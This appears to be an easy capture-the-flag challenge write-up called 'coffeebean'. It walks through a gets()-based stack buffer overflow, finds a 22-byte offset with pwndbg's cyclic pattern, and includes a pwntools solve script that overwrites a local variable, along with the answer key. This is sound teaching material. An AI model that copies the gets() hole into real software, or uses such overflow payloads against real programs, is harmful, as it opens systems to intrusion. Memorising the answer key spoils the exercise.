# Challenge Name
coffeebean

## Learning Objective
Test understanding of the stack overflow

## Description 
The perfect beans for the perfect cup of coffee.

## Difficulty:
easy

## Guide
Let's look at the source code.

```c
void harvest() {
    char beans[10] = "notgood";
    char condition[20];
    printf("How are the beans doing? \n");
    gets(condition);
    keg(beans);
}
```

There is a buffer overflow vulnerability with the use of `gets` for the `condition` variable.

The `keg` function also checks for the `beans` variable:

```c
    if (strcmp(beans, "perfect") == 0){
```

`beans` is set to `notgood`, so what we actually want to do here is to overwrite the **variable**.

But first we need to find out exactly how many bytes we need to overwrite.

This time we will also set a breakpoint at `keg` function to check.

### strmcp in asm
Before the program calls `strcmp`, `rsi` & `rdi` registers will point to the location of the 2 values that are being compared.

```shell
rsi: value 1
rdi: value 2
call strcmp@plt 
```

### Finding offset
Run the following in gdb:
1. `break keg`
2. `run`
3. send a cyclic pattern of 30 when program asks for input (`cyclic 30`)

You should see this in the disassembly:
```shell
   0x4007b0 <keg+25>    lea    rsi, [rip + 0x1d1]               RSI => 0x400988 ◂— jo 0x4009ef /* 'perfect' */
   0x4007b7 <keg+32>    mov    rdi, rax                         RDI => 0x7fffffffdc46 ◂— 'aadaaaaa'
   0x4007ba <keg+35>    call   strcmp@plt                  <strcmp@plt>
```

We can see that the `rdi` register is pointing to our input. Let's check what is the offset we need.

```shell
pwndbg> cyclic -l aadaaaaa
Finding cyclic pattern of 8 bytes: b'aadaaaaa' (hex: 0x6161646161616161)
Found at offset 22
```

What this means is that we need to fill 22 bytes in the input first, before we can overwrite `notgood`. With this info, we can write our solve script.

### Script
```py
from pwn import *

# connect to remote server
p = remote("SERVER", port)

# send 22 bytes first
payload = b'A' * 22

#overwrite `notgood`
payload += b'perfect'

# send payload to server
p.sendline(payload)
p.interactive()
```


## Solution
Refer to solve.py

## Hints
1. how do you check how many bytes to overflow?
2. https://stackoverflow.com/questions/63110044/strcmp-in-nasm-x86-64-registers

## Attached Files
chall.c
chall

## Resources
- https://stackoverflow.com/questions/63110044/strcmp-in-nasm-x86-64-registers

## Flag
TBD